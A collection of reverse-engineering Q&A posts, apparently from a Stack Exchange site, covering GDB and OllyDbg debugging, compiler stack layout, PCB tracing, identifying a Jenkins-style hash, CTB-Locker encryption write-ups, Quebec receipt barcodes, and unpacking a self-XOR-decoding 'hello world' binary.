"Reversing a Mac OS X binary that appears to be non encrypted, backtrace just shows mach_msg_trap ()","815","","<p>Currently I have a binary that I am investigating.  The application is GUI / event driven, so that makes it difficult to set a break point.  I would like to set a break point on a certain button click, so I thought I would click the button, and then run a <code>backtrace</code> in GDB to see what functions were called when I clicked the button, but the output of the <code>bt</code> is just showing <code>mach_msg_trap()</code>, and a few other ""functions"" I suppose.  Does anyone know why I'm in the <code>mach_msg_trap()</code>  I am assuming it's some security feature implemented by Apple to prevent people from reversing their software, I just thought I would ask, as my googlefu didn't really return any tangible results.</p>

<p><img src=""https://i.stack.imgur.com/ZpuXV.png"" alt=""Screenshot of the GDB output""></p>
","<p>Well, my Mac fu isn't too strong, but I have terminal access to a Mac and will give it a wild shot, hoping to provide you with the insight required to proceed.</p>

<p><code>info sharedlibrary</code> on the GDB prompt will tell you details about the ranges of the shared libraries inside of which those functions reside. But we know that already from the function names.</p>

<p><a href=""https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ApplicationKit/Classes/NSApplication_Class/Reference/Reference.html""><code>NSApplication</code></a> comes from: Cocoa.</p>

<blockquote>
  <p>The <code>NSApplication</code> object maintains a list of all the <code>NSWindow</code> objects
  the application uses, so it can retrieve any of the application’s
  <code>NSView</code> objects.</p>
</blockquote>

<p>So my suggestion would be to start by starting the application</p>

<pre><code>gdb --args /path/to/binary optional arguments for program
</code></pre>

<p>and then set a breakpoint:</p>

<pre><code>b NSApplicationMain
</code></pre>

<p>(can be done inside <code>.gdbinit</code> obviously)</p>

<p>Then let the application continue. Break into it using <kbd>Ctrl</kbd>+<kbd>C</kbd>. Most likely the <code>backtrace</code> will be similar to what you saw before, but probably not up to <code>mach_msg_trap()</code>.</p>

<p>Then you go to one frame that uses a function which has a reference to the <code>NSApplication</code> instance. You can find the frame numbers with <code>bt</code>, obviously. So say:</p>

<pre><code>f 9
</code></pre>

<p>there you should be able to use GDB's <code>call</code>. Now, my Objective-C/C++ fu is even weaker than my Mac fu, but you can use</p>

<pre><code>set language
</code></pre>

<p>to list the available languages (which influences the syntax for <code>call</code>). So you should probably switch to one of the Objective-C/C++ alternatives as appropriate. On my Mac I have the following language options:</p>

<pre><code>(gdb) set language
The currently understood settings are:

local or auto    Automatic setting based on source file
ada              Use the Ada language
c                Use the C language
c++              Use the C++ language
asm              Use the Asm language
minimal          Use the Minimal language
fortran          Use the Fortran language
objective-c      Use the Objective-c language
objective-c++    Use the Objective-c++ language
java             Use the Java language
modula-2         Use the Modula-2 language
pascal           Use the Pascal language
scheme           Use the Scheme language
</code></pre>

<p><code>call</code> lets you call functions inside the context of the running program (and GDB has command line completion for symbols it knows of). So calling <code>mainWindow</code> of the <code>NSApplication</code> instance would appear as a good idea and then drilling down from there.</p>

<p>From there you should be able to figure out where your button comes into play and set the breakpoint, no?</p>

<p>Basically if you know a certain parameter of a certain call in the framework references your button (we'll assume it has a pointer somehow) you can use the</p>

<pre><code>break location if condition
</code></pre>

<p>syntax to make sure the breakpoint will only trigger for the button press. An alternative is the <code>ignore</code> command which will ignore X hits of a breakpoint and only trigger after that.</p>
","2834"
"Creating my own custom structure in Ollydbg","814","","<p>In Ollydbg's hex dump window (lower left quadrant of CPU window) one can interpret data as structures, you can right-click on one or more bytes and see the options ""Decode as structure"" or ""Decode as pointer to structure"" (if more than one byte selected).  It then opens a new window with the data laid out vertically, with each data element shown as a row.  You can decode more than one instance.  </p>

<p>However, I'd like to add my own structure types.  Imagine I have this structure:</p>

<pre><code>typedef struct {
           double x,y,z;   
           unsigned char id;
           int label;
           char *name_string;
           anotherStructType *struct;       
           } model_type;
</code></pre>

<p>Below are some images showing the steps, with the fixed structure type ""COORD"" chosen.  Imagine I want to decode it instead with the above 'model_type' structure type.  Perhaps the answer lies in some command line or .ini manual setting?</p>

<p>Also, it would be nice if this could be used along with labels to identify struct elements in the disassembly window, for example [EAX+1C] could be interpreted as 'player.id' if one could somehow tell Olly EAX is the base pointer.  But perhaps I'm getting carried away...</p>

<p><a href=""https://i.stack.imgur.com/YBsmI.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YBsmI.png"" alt=""enter image description here""></a></p>

<p><a href=""https://i.stack.imgur.com/EIXAu.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/EIXAu.png"" alt=""enter image description here""></a> 
<a href=""https://i.stack.imgur.com/tUIyb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/tUIyb.png"" alt=""enter image description here""></a></p>
","<p><strong>BE AWARE</strong> <code>what follows are undocumented stuff</code> </p>

<p>create a <code>file either named as [binary].arg</code> or <code>common.arg</code><br>
the first name is applicable to only to the specific [binary]<br>
the second name common.arg is applicable globally </p>

<p>paste this inside the file </p>

<pre><code>STRUCT _MYSTRUCT
QWORD DOUBLE x
QWORD DOUBLE y
QWORD DOUBLE z
BYTE  CHAR  id
DWORD INT label
DWORD ASCII* name
DWORD INT* foo
END
</code></pre>

<p>drop the file in the folder where ollydbg resides.<br>
_MYSTRUCT should be available in the drop down box now </p>

<p><code>STRUCT</code> is a keyword<br>
struct names need a leading underscore<br>
the members are defined like<br>
FIELDSIZE, TYPENAME , MEMBERNAME   </p>

<p>valid FIELDSIZE are   </p>

<ol>
<li>BYTE</li>
<li>WORD</li>
<li>THREE</li>
<li>DWORD</li>
<li>QWORD</li>
<li>TBYTE</li>
</ol>

<p>that correspond to sizes <code>1,2,3,4,8,16</code><br>
TYEPNAMES are vast you should try and err<br>
i have posted some which are common<br>
Notice i have cast Your last Structure as INT* instead of anotherstruct*<br>
for which you may need to add a custom type in the file<br>
you can specify a repeat count with asterisk *    </p>

<pre><code>BYTE*48 BYTE somecrap  
</code></pre>

<p>somecrap is MemberName a string    </p>

<p><code>END is a keyword</code> denoting end of structure    </p>

<p>some dummy src that use the structure from your Query compiled executed and 
screen shot below</p>

<p>src </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#pragma pack(1)
typedef struct _TESTY {
    int a;
    int b;
}Testy,*PTesty;
typedef struct _MYSTRUCT {
    double x,y,z;
    unsigned char id;
    int label;
    char *name;
    Testy *foo;
}MyStruct,*PMyStruct;

int main (void) {
    MyStruct blah;
    Testy arrgh;
    char *test = ""hello do i know c ?"";
    memset(&amp;blah,0,sizeof(blah));
    blah.x=43.0;
    blah.y=76.34;
    blah.z=0.0;
    blah.id = 'a';
    blah.label = 54;
    blah.name = test;
    arrgh.a =45;
    arrgh.b =54000;
    blah.foo = &amp;arrgh;
    printf(""%f\n"",blah.x);
    printf(""%s\n"",blah.name);
    printf(""%d\n"",blah.foo-&gt;b);
    return 0;   
}
</code></pre>

<p>executed </p>

<pre><code>structy.exe
43.000000
hello do i know c ?
54000 
</code></pre>

<p>running with ollydbg </p>

<pre><code>ollydbg.exe structy.exe 
</code></pre>

<p>the log windows shows it used the structure definitions we provided by xxxxx.arg </p>

<pre><code>Log data
Address   Message
          OllyDbg v2.01
          Command line: structy.exe
          Loading function descriptions from 'common.arg'
            2 structures
            Total size of known data is 1521777 bytes
</code></pre>

<p>screen shot 
<a href=""https://i.stack.imgur.com/y3tEu.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/y3tEu.png"" alt=""enter image description here""></a></p>
","11911"
"Why addresses of variable on stack are not consecutive?","814","","<p>The code below is generated by gcc from a simple scanf program. 
My question is that </p>

<ol>
<li>Why these 3 addresses of variables are not consecutive when allocated?</li>
<li>If not, when could I speculate the number of variables generated from stack by watching the
clause like <code>add esp, N</code> which is often at the end of a routine? Is it related with calling convention?</li>
<li>In this example, why compiler does not generated the <code>add esp, 20h</code> with it?</li>
</ol>

<p>C code </p>

<pre><code>#include &lt;stdio.h&gt;
int main() {
  int x;
  printf (""Enter X:\n"");
  scanf (""%d"", &amp;x);
  printf (""You entered %d...\n"", x);
  return 0;
};
</code></pre>

<p>asm</p>

<pre><code>main            proc near
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_4           = dword ptr -4
                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF0h
                sub     esp, 20h
                mov     [esp+20h+var_20], offset aEnterX ; ""Enter X:""
                call    _puts
                mov     eax, offset aD  ; ""%d""
                lea     edx, [esp+20h+var_4]
                mov     [esp+20h+var_1C], edx
                mov     [esp+20h+var_20], eax
                call    ___isoc99_scanf
                mov     edx, [esp+20h+var_4]
                mov     eax, off set aYouEnteredD___ ; ""You entered %d...\n""
                mov     [esp+20h+var_1C], edx
                mov     [esp+20h+var_20], eax
                call    _printf
                mov     eax, 0
                leave
                retn
main            endp
</code></pre>
","<p>There is only actually one local variable in your function: x. This variable is located on the stack where you would expect it, at <code>ebp-4</code>. IDA is getting confused because this particular function, instead of pushing variables onto the stack before calling a function, is moving them instead. This tricks IDA into thinking those are local variables when they're actually just the locations at the top of the stack.</p>

<pre><code>mov     [esp+20h+var_1C], edx  &lt;===&gt; push edx
mov     [esp+20h+var_20], eax  &lt;===&gt; push eax
</code></pre>

<p>I can't definitively explain why gcc is doing this, but my guess is that you compiled without optimizations. This instruction layout might make debugging easier.</p>

<p>I think you're also confusing calling conventions with local variable cleanup. Every function needs to clean up its own local variable area. Your main() function is doing that with the <a href=""https://stackoverflow.com/questions/5474355/about-leave-in-x86-assembly""><code>leave</code></a> instruction. Calling conventions are related to cleaning up the <strong>parameters</strong> passed to a function.</p>
","4255"
"Tools to show the registers and memory locations in use during execution?","813","","<p>I am looking for something that is like <code>gdb</code> but maybe with a GUI that can show all registers current values ans the current values of memory and things on the stack?  Freeware is preferred.  I have a free version of IDA and anything that comes with Kali Linux.  It is an ELF file that is stripped.</p>
","<p>Perhaps you should try <code>DDD</code>. It's a <code>GUI</code> for <code>GDB</code> with lots of great features that simplify debugging for beginners &amp; experts too. I have to warn you though, if your binary is stripped what matters most is the methodology. Most debuggers are extremely efficient if debug symbols are present (in case of an <code>ELF</code>, the <code>DWARF</code> is what you need to check). Without debug symbols all you can do is go through the code step by step, setting breakpoints at locations where the assembly code seems to be interesting. </p>

<p>You must know that reverse engineering is a challenge, not an easy task, and that there's no such thing as a magic tool. All the tools rely on algorithm which are not, unfortunately, flawless. Disassemblers can fail, decompilers can stumble upon patterns they can't turn into high-level code, and so on and so forth.</p>

<p>You have to develop a methodology which you'll have to adapt with experience. That's how you'll be able to forge good reversing skills. Meanwhile, the forum is open for questions, hopefully as precise &amp; concise as the answers.</p>
","4204"
"Draw circuit of a multilayer PCB","811","","<p>I have found a multilayer PCB of which I need to draw the circuit. At first, I tried to find the circuit on the internet using part numbers, but I did not get any result. The PCB is from a very old alarm installation.</p>

<p>Are there any tools or techniques I can use to get to know the structure of the layers I can't see?</p>
","<p>There are <a href=""http://www.pcbreverseengineering.com/"" rel=""nofollow"">comprehensive tools</a> that can do precisely this. Part of the software that comes with them allows you to place part numbers between pads and have the circuit diagram automatically generated for you. Unfortunately, they're likely to set you back a fair bit of cash.</p>

<p>An alternative is to use corrosives and sharp implements to manually split the layers, but that's difficult and prone to mistakes. If you've got a number of boards you can destroy in the process, this is probably the cheapest option.</p>
","1473"
"Hash algorithm written in C decompiled with IDA","810","","<p>I have been working on rewriting a program, although it uses a hash to fingerprint the file, I have used IDA to find the function doing the hash and what it is doing to the file before it sends it to the hash function.</p>

<p>I just have a couple questions about what is going on, I know I can simply invoke it as it is in a DLL, but I want to understand what is going on as well.</p>

<pre><code>unsigned int __cdecl newhash(int a1, unsigned int a2, int zero)
{
  int content; // ebx@1
  int v4; // ecx@1
  int v5; // edx@1
  int i; // eax@1
  int v7; // ecx@2
  unsigned int v8; // eax@2
  int v9; // edx@2
  int v10; // ecx@2
  int v11; // eax@2
  int v12; // edx@2
  int v13; // ecx@2
  int v14; // eax@2
  unsigned int v15; // eax@3
  int v16; // edx@15
  int v17; // ecx@15
  int v18; // eax@15
  int v19; // edx@15
  int v20; // ecx@15
  int v21; // eax@15
  int v22; // edx@15
  unsigned int contentLength; // [sp+Ch] [bp-4h]@1

  content = a1;
  contentLength = a2;
  v4 = -1640531527;
  v5 = -1640531527;
  for ( i = zero; contentLength &gt;= 12; contentLength -= 12 )
  {
    v7 = (*(_BYTE *)(content + 7) &lt;&lt; 24)
       + (*(_BYTE *)(content + 6) &lt;&lt; 16)
       + (*(_BYTE *)(content + 5) &lt;&lt; 8)
       + *(_BYTE *)(content + 4)
       + v4;
    v8 = (*(_BYTE *)(content + 11) &lt;&lt; 24)
       + (*(_BYTE *)(content + 10) &lt;&lt; 16)
       + (*(_BYTE *)(content + 9) &lt;&lt; 8)
       + *(_BYTE *)(content + 8)
       + i;
    v9 = (v8 &gt;&gt; 13) ^ ((*(_BYTE *)(content + 3) &lt;&lt; 24)
                     + (*(_BYTE *)(content + 2) &lt;&lt; 16)
                     + (*(_BYTE *)(content + 1) &lt;&lt; 8)
                     + *(_BYTE *)content
                     + v5
                     - v7
                     - v8);
    v10 = (v9 &lt;&lt; 8) ^ (v7 - v8 - v9);
    v11 = ((unsigned int)v10 &gt;&gt; 13) ^ (v8 - v9 - v10);
    v12 = ((unsigned int)v11 &gt;&gt; 12) ^ (v9 - v10 - v11);
    v13 = (v12 &lt;&lt; 16) ^ (v10 - v11 - v12);
    v14 = ((unsigned int)v13 &gt;&gt; 5) ^ (v11 - v12 - v13);
    v5 = ((unsigned int)v14 &gt;&gt; 3) ^ (v12 - v13 - v14);
    v4 = (v5 &lt;&lt; 10) ^ (v13 - v14 - v5);
    i = ((unsigned int)v4 &gt;&gt; 15) ^ (v14 - v5 - v4);
    content += 12;
  }
  v15 = a2 + i;
  switch ( contentLength )
  {
    case 0xBu:
      v15 += *(_BYTE *)(content + 10) &lt;&lt; 24;
      goto LABEL_5;
    case 0xAu:
LABEL_5:
      v15 += *(_BYTE *)(content + 9) &lt;&lt; 16;
      goto LABEL_6;
    case 9u:
LABEL_6:
      v15 += *(_BYTE *)(content + 8) &lt;&lt; 8;
      goto LABEL_7;
    case 8u:
LABEL_7:
      v4 += *(_BYTE *)(content + 7) &lt;&lt; 24;
      goto LABEL_8;
    case 7u:
LABEL_8:
      v4 += *(_BYTE *)(content + 6) &lt;&lt; 16;
      goto LABEL_9;
    case 6u:
LABEL_9:
      v4 += *(_BYTE *)(content + 5) &lt;&lt; 8;
      goto LABEL_10;
    case 5u:
LABEL_10:
      v4 += *(_BYTE *)(content + 4);
      goto LABEL_11;
    case 4u:
LABEL_11:
      v5 += *(_BYTE *)(content + 3) &lt;&lt; 24;
      goto LABEL_12;
    case 3u:
LABEL_12:
      v5 += *(_BYTE *)(content + 2) &lt;&lt; 16;
      goto LABEL_13;
    case 2u:
LABEL_13:
      v5 += *(_BYTE *)(content + 1) &lt;&lt; 8;
      goto LABEL_14;
    case 1u:
LABEL_14:
      v5 += *(_BYTE *)content;
      break;
    default:
      break;
  }
  v16 = (v15 &gt;&gt; 13) ^ (v5 - v4 - v15);
  v17 = (v16 &lt;&lt; 8) ^ (v4 - v15 - v16);
  v18 = ((unsigned int)v17 &gt;&gt; 13) ^ (v15 - v16 - v17);
  v19 = ((unsigned int)v18 &gt;&gt; 12) ^ (v16 - v17 - v18);
  v20 = (v19 &lt;&lt; 16) ^ (v17 - v18 - v19);
  v21 = ((unsigned int)v20 &gt;&gt; 5) ^ (v18 - v19 - v20);
  v22 = ((unsigned int)v21 &gt;&gt; 3) ^ (v19 - v20 - v21);

  return (((v22 &lt;&lt; 10) ^ 
           (unsigned int)(v20 - v21 - v22)) &gt;&gt; 15) ^ 
           (v21 - v22 - ((v22 &lt;&lt; 10) ^ (v20 - v21 - v22)));
}
</code></pre>

<p>a1 is an address location
a2 is the length of the file to hash
zero I renamed as it always sends zero for whatever reason.</p>

<p>Now for the questions:</p>

<ol>
<li>First and foremost, is this a standard algorithm like CRC or
something? </li>
<li>Is there a reason for the v4 and v5 variables to be -1640531527?</li>
<li>What is the purpose of <code>(*(_BYTE *)(content + 7) &lt;&lt; 24)</code> isn't a byte only 8 bits, so won't it be 0 every time? I looked up the order of operations and it seems that the casting is first then the bit operations, so it means it converts it to the 8th byte in the file and bit shifts it 24 bits right? why?</li>
<li>Why are some bits signed and some unsigned, and would it change the outcome if there is a mix?</li>
</ol>

<p>Those are most of my questions, I understand it is going through all the bytes and getting a total to figure out the ""hash"" for the file, I understand that the switch case is taking care of the situation of the file not being exactly divisible by 12. I think once I understand the logic behind the bitwise operations then it will be more clear.</p>
","<p>-1640531527 is hexadecimal '0x9e3779b9'.
This number is used in boost hash function.
The code <a href=""http://burtleburtle.net/bob/c/lookup2.c"">here</a> in function <code>ub4 hash( k, length, initval)</code> looks similar to yours, at least in the last part.
I think that it is a good point to start googling from.</p>

<p>As far as I can say it is probably intermediate variant(lookup2) of <a href=""http://en.wikipedia.org/wiki/Jenkins_hash_function"">Jenkins Hash</a></p>
","8867"
"Where to find a full analysis of the encryption scheme of CTB-Locker?","804","","<p>CTB-Locker is a currently active ransomware that encrypts files to lock users out.</p>

<p>Here are a few links about this malware:</p>

<ul>
<li><a href=""http://securelist.com/analysis/publications/64608/a-new-generation-of-ransomware/"" rel=""nofollow"">A new generation of ransomware: Elliptic curve cryptography + Tor + Bitcoin</a>, by Fedor Sinitsyn, July 24, 2014.</li>
<li><a href=""http://www.eset.com/int/about/press/eset-blog/article/ctb-locker-ransomware-striking-in-europe-and-latin-america/"" rel=""nofollow"">CTB-Locker: Multilingual Malware Demands Ransom</a>, by Pablo Ramos, January 21, 2015.</li>
<li><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/ctb-locker-ransomware-includes-freemium-feature-extends-deadline/"" rel=""nofollow"">CTB-Locker Ransomware Includes Freemium Feature, Extends Deadline</a>, by Trend Micro, January 21, 2015.</li>
<li><a href=""http://www.bleepingcomputer.com/virus-removal/ctb-locker-ransomware-information"" rel=""nofollow"">CTB Locker and Critroni Ransomware Information Guide and FAQ</a>, by Lawrence Abrams, January 29, 2015.</li>
<li><a href=""https://zairon.wordpress.com/2015/02/09/ctb-locker-files-decryption-demonstration-feature/"" rel=""nofollow"">CTB-Locker: files decryption demonstration feature</a>, by Zairon, February 9, 2015.</li>
<li><a href=""http://christophe.rieunier.name/securite/CTB-Locker/CTB-Locker_analysis_en.php"" rel=""nofollow"">CTB-Locker dropper</a>, by Christophe Rieunier.</li>
<li><a href=""https://www.decryptcryptolocker.com/"" rel=""nofollow"">decryptcryptolocker.com</a>, by FireEye and Fox IT (doesn't seems to work for CTB-Locker).</li>
<li><a href=""http://en.wikipedia.org/wiki/CryptoLocker"" rel=""nofollow"">CryptoLocker</a>, Wikipedia (a similar Ransomware).</li>
</ul>

<p>Is there a complete analysis about the encryption used by CTB-Locker, and some hints about possible cryptanalysis based on some weaknesses of this cryptographic scheme that can be used to recover the encrypted files.</p>

<p>The idea would be to produce a (free) tool similar to <a href=""https://www.decryptcryptolocker.com/"" rel=""nofollow"">decryptcryptolocker.com</a>, that can perform the decryption for users.</p>
","<p>I found a <a href=""https://zairon.wordpress.com/2015/02/17/ctb-locker-encryptiondecryption-scheme-in-details/"" rel=""nofollow"">full analysis of the cipher algorithm of CTB-Locker</a> performed by <a href=""https://zairon.wordpress.com/"" rel=""nofollow"">Zairon</a>. </p>

<p>He's not really optimistic about the possibility to cryptanalyse the files as the first paragraph of the blog post is the following:</p>

<blockquote>
  <p>After my last post about CTB-Locker I received a lot of e-mails from people asking for a complete analysis of the malware. Most of them wanted to know if it’s possible to restore the compromised files without paying the ransom. The answer is simple: it’s impossible without knowing the Master key! That key resides on the malicious server and it’s the only way to restore every single compromised file.</p>
</blockquote>

<p>And, follow a full analysis of the encryption scheme of CTB-Locker. A good reading for anybody wants to know more about it !</p>

<ul>
<li><a href=""https://zairon.wordpress.com/2015/02/17/ctb-locker-encryptiondecryption-scheme-in-details/"" rel=""nofollow"">CTB-Locker encryption/decryption scheme in details</a>, by Zairon, February 17, 2015.</li>
</ul>
","8273"
"Reverse Engineering Quebec Canada PDF417 restaurant bills","803","","<p>Let me explain what I'm trying to do, and then where I am at...</p>

<p>As you can see on this image :</p>

<p><img src=""https://i.stack.imgur.com/sRldz.jpg"" alt=""enter image description here""></p>

<p>There is a PDF417 at the end containing a string that at my best guess is some base64 string.</p>

<p>Here it is :</p>

<blockquote>
  <p>3GLDjVKaUbwysHTAffMyChP1wqzvc/h41aebPrw0PsprtPy85tBa87vzsLw6hL8t5FBJLGlHODGQ0O8ml0OKs7mmqgB1pZsAvcs2CyAgICA0MzA2MzjAyzYLICAgICBKdWxpZSAgIDMwU09CUwAApQAAagcAAAAAAAAA</p>
</blockquote>

<p>And when I decode it, I get the following :</p>

<p><img src=""https://i.stack.imgur.com/dOVD1.png"" alt=""enter image description here""></p>

<p>I kind of found the waitress name ""Julie"" and in front of it, there is a bunch of space characters, which I guess it is because there is a limited size to the name.</p>

<p>Same for the bill number, and the table number.</p>

<p>But I was wondering what kind of information was in the previous bits, so any idea how to proceed to decode/decrypt this information would be greatly appreciated.</p>

<hr>

<p>The machine used for the generation of the base64 string and its content is a ""AEC-6822"".</p>

<p>And here is some unrelated information to what I'm trying to do, but may help... (I hope)
<a href=""http://www.revenuquebec.ca/documents/en/publications/in/in-577-v(2013-08).pdf"" rel=""nofollow noreferrer"">http://www.revenuquebec.ca/documents/en/publications/in/in-577-v(2013-08).pdf</a></p>

<p>Thank you very much,
ANY help is greatly appreciated!</p>
","<p>From <a href=""https://www.ctf.ca/ctfweb/Documents/PDF/2009ctj/09ctj4-ainsworth.pdf"" rel=""nofollow"">https://www.ctf.ca/ctfweb/Documents/PDF/2009ctj/09ctj4-ainsworth.pdf</a> --</p>

<blockquote>
  <p>In addition to ensure the integrity of the information presented on
  the receipt, the solution designed by Revenu Québec ensures that the
  bar-code scanned by the [handheld] reader is produced by the
  certificate delivered by [Revenu Québec] to the specific MEV [SRM]
  which generates this signature. The signature is produced by a
  combination of SHA-256 and ECC-224.</p>
  
  <p>This method uses a certificate which includes a public and a private
  key issued for each MEV [SRM] with information that identifies the MEV
  [SRM] and the restaurant.</p>
  
  <p>We choose the elliptic curve algorithm (ECC) to reduce the length of
  the result (<strong><em>to be converted to a barcode</em></strong>) and to maintain a good
  strength.</p>
</blockquote>

<p>So apparently the previous bits in the barcode make up a digital signature, which would explain the high entropy.</p>
","6857"
"What is ""instruction camouflage"" obfuscation?","801","","<p>I have an obfuscated binary which only print a simple <code>Hello World!</code>
and exit like this:</p>

<pre><code>Hello World!
</code></pre>

<p>But, when I am looking at the assembly with <code>objdump</code>, I cannot find any
call to <code>printf</code> or <code>write</code>, nor find the string <code>Hello World!</code>.</p>

<pre><code>0804840c &lt;main&gt;:
 804840c:       be 1e 84 04 08          mov    $0x804841e,%esi
 8048411:       89 f7                   mov    %esi,%edi
 8048413:       b9 26 00 00 00          mov    $0x26,%ecx
 8048418:       ac                      lods   %ds:(%esi),%al
 8048419:       34 aa                   xor    $0xaa,%al
 804841b:       aa                      stos   %al,%es:(%edi)
 804841c:       e2 fa                   loop   8048418 &lt;main+0xc&gt;
 804841e:       23 4f 29                and    0x29(%edi),%ecx
 8048421:       46                      inc    %esi
 8048422:       ae                      scas   %es:(%edi),%al
 8048423:       29 4e 5a                sub    %ecx,0x5a(%esi)
 8048426:       29 6e ae                sub    %ebp,-0x52(%esi)
 8048429:       c2 9c 2e                ret    $0x2e9c
 804842c:       ae                      scas   %es:(%edi),%al
 804842d:       a2 42 17 54 55          mov    %al,0x55541742
 8048432:       55                      push   %ebp
 8048433:       23 46 69                and    0x69(%esi),%eax
 8048436:       e2 cf                   loop   8048407 &lt;frame_dummy+0x27&gt;
 8048438:       c6 c6 c5                mov    $0xc5,%dh
 804843b:       8a fd                   mov    %ch,%bh
 804843d:       c5 d8 c6 ce 8b          vshufps $0x8b,%xmm6,%xmm4,%xmm1
 8048442:       a0 aa 90 90 90          mov    0x909090aa,%al
 8048447:       90                      nop
 ...
 804844f:       90                      nop
</code></pre>

<p>The obfuscation technique claimed to be used here is called <em>instruction
camouflage</em> (see this <a href=""http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.125.5028"" rel=""nofollow"">paper</a>). Can someone explain what is it and how does it works ?</p>
","<p>Instruction camouflage is an obfuscation technique against simple naive static
analysis of the binary. The binary program is composed of two parts:</p>

<ul>
<li>A decoder</li>
<li>An encoded payload</li>
</ul>

<p>When executed, the binary first goes to the decoder and decode the
payload that unveil the real assembly code. At the end, the decoder
jumps to the decoded payload and execute the code.</p>

<p>The benefit of this technique is that statically disassembling the
binary will not give you hints on what is really doing the program.
Somehow, it forces the analyst to execute first the decoder part (for
real or symbolically) and, then, look at the decoded payload.</p>

<p>In the proposed example, the decoder part is the following:</p>

<pre><code>0804840c &lt;main&gt;:
 804840c:       be 1e 84 04 08          mov    $0x804841e,%esi
 8048411:       89 f7                   mov    %esi,%edi
 8048413:       b9 26 00 00 00          mov    $0x26,%ecx
 8048418:       ac                      lods   %ds:(%esi),%al
 8048419:       34 aa                   xor    $0xaa,%al
 804841b:       aa                      stos   %al,%es:(%edi)
 804841c:       e2 fa                   loop   8048418 &lt;main+0xc&gt;
</code></pre>

<p>You can see that there is a loop between <code>0x8048418</code> and <code>0x804841c</code>
which apply a xor <code>0xaa</code> to each byte in the payload (from <code>0x804841e</code>
to  <code>0x804841e + 0x25 = 0x8048443</code>, the loop counter is <code>%ecx</code>).</p>

<p>So, the best way to know what is done in the payload is to take <code>gdb</code>
and to set a breakpoint after the decoder has completed his task:</p>

<pre><code>GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later
(gdb) break main
Breakpoint 1 at 0x804840c
(gdb) run
Starting program: ./instruction_camouflage

Breakpoint 1, 0x0804840c in main ()
</code></pre>

<p>Lets check that the code hasn't change.</p>

<pre><code>(gdb) disas
Dump of assembler code for function main:
=&gt; 0x0804840c &lt;+0&gt;: mov    $0x804841e,%esi
   0x08048411 &lt;+5&gt;: mov    %esi,%edi
   0x08048413 &lt;+7&gt;: mov    $0x26,%ecx
   0x08048418 &lt;+12&gt;:    lods   %ds:(%esi),%al
   0x08048419 &lt;+13&gt;:    xor    $0xaa,%al
   0x0804841b &lt;+15&gt;:    stos   %al,%es:(%edi)
   0x0804841c &lt;+16&gt;:    loop   0x8048418 &lt;main+12&gt;
   0x0804841e &lt;+18&gt;:    and    0x29(%edi),%ecx
   0x08048421 &lt;+21&gt;:    inc    %esi
   0x08048422 &lt;+22&gt;:    scas   %es:(%edi),%al
   0x08048423 &lt;+23&gt;:    sub    %ecx,0x5a(%esi)
   0x08048426 &lt;+26&gt;:    sub    %ebp,-0x52(%esi)
   0x08048429 &lt;+29&gt;:    ret    $0x2e9c
   0x0804842c &lt;+32&gt;:    scas   %es:(%edi),%al
   0x0804842d &lt;+33&gt;:    mov    %al,0x55541742
   0x08048432 &lt;+38&gt;:    push   %ebp
   0x08048433 &lt;+39&gt;:    and    0x69(%esi),%eax
   0x08048436 &lt;+42&gt;:    loop   0x8048407 &lt;frame_dummy+39&gt;
   0x08048438 &lt;+44&gt;:    mov    $0xc5,%dh
   0x0804843b &lt;+47&gt;:    mov    %ch,%bh
   0x0804843d &lt;+49&gt;:    vshufps $0x8b,%xmm6,%xmm4,%xmm1
   0x08048442 &lt;+54&gt;:    mov    0x909090aa,%al
   0x08048447 &lt;+59&gt;:    nop
...
   0x0804844f &lt;+67&gt;:    nop
End of assembler dump.
</code></pre>

<p>Let's put a breakpoint just after the loop and continue till it is reached.</p>

<pre><code>(gdb) break *0x0804841e
Breakpoint 2 at 0x804841e
(gdb) continue
Continuing.

Breakpoint 2, 0x0804841e in main ()
</code></pre>

<p>Now, we should be able to access the code as it will be executed.</p>

<pre><code>(gdb) disas
Dump of assembler code for function main:
   0x0804840c &lt;+0&gt;: mov    $0x804841e,%esi
   0x08048411 &lt;+5&gt;: mov    %esi,%edi
   0x08048413 &lt;+7&gt;: mov    $0x26,%ecx
   0x08048418 &lt;+12&gt;:    lods   %ds:(%esi),%al
   0x08048419 &lt;+13&gt;:    xor    $0xaa,%al
   0x0804841b &lt;+15&gt;:    stos   %al,%es:(%edi)
   0x0804841c &lt;+16&gt;:    loop   0x8048418 &lt;main+12&gt;
=&gt; 0x0804841e &lt;+18&gt;:    and    %ebp,%esp
   0x08048420 &lt;+20&gt;:    sub    $0x4,%esp
   0x08048423 &lt;+23&gt;:    and    $0xfffffff0,%esp
   0x08048426 &lt;+26&gt;:    add    $0x4,%esp
   0x08048429 &lt;+29&gt;:    push   $0x8048436
   0x0804842e &lt;+34&gt;:    call   0x80482f0 &lt;puts@plt&gt;
   0x08048433 &lt;+39&gt;:    mov    %ebp,%esp
   0x08048435 &lt;+41&gt;:    ret    
   0x08048436 &lt;+42&gt;:    dec    %eax
   0x08048437 &lt;+43&gt;:    gs
   0x08048438 &lt;+44&gt;:    insb   (%dx),%es:(%edi)
   0x08048439 &lt;+45&gt;:    insb   (%dx),%es:(%edi)
   0x0804843a &lt;+46&gt;:    outsl  %ds:(%esi),(%dx)
   0x0804843b &lt;+47&gt;:    and    %dl,0x6f(%edi)
   0x0804843e &lt;+50&gt;:    jb     0x80484ac &lt;__libc_csu_init+76&gt;
   0x08048440 &lt;+52&gt;:    and    %ecx,%fs:(%edx)
   0x08048443 &lt;+55&gt;:    add    %dl,-0x6f6f6f70(%eax)
   0x08048449 &lt;+61&gt;:    nop
   ...
   0x0804844f &lt;+67&gt;:    nop
End of assembler dump.
</code></pre>

<p>And, still there is these strange instructions after the <code>ret</code>, lets visualize it as a string.</p>

<pre><code>(gdb) x /s 0x08048436
0x8048436 &lt;main+42&gt;:     ""Hello World!\n""
</code></pre>

<p>So, we found all the pieces of the program and how it works.</p>
","1674"
